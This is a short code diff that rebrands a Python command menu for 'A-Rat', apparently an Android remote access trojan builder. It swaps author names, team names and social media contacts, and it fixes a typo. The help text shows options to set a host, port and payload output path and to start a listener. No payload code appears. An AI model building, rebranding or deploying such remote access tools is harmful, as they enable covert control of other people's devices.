@@ -21,8 +21,8 @@ def logo():
 \t |$   $|      |$   $\ |$   $|    $|
 
 \t [*] Versions : 1.0.0
-\t [*] Coded By ./Xi4u7
-\t [*] AndroSec1337 Cyber Team
+\t [*] Coded By @ManagerDC
+\t [*] HackXone Cyber Team
   """)
 
 def help():
@@ -32,17 +32,17 @@ def help():
        set PORT       : Set Your Port (e.g set PORT 1337)
        set OUTPUT     : Set Your Output Name And Path (e.g set OUTPUT /home/payload)
        show values    : Show Host, Port And Output Value
-       start listener : Start Your Conection Server 
+       start listener : Start Your Connection Server 
 
   Please Report This bug To My FB
-  FB : https://m.facebook.com/sefina.dewi
-  FP : https://m.facebook.com/androsec1337cyberteam\n""")
+  FB : https://m.facebook.com/itz.dollydc.175
+  TG : https://t.me/ManagerDC/n""")
        
 def main():
     global host, port, output
 
     while True:
-        cmd = raw_input("[*] A-Rat@AndroSec1337:~# ").lower()
+        cmd = raw_input("[*] A-Rat@ManagerDCKit:~# ").lower()
 
         if cmd == "help":
             help()
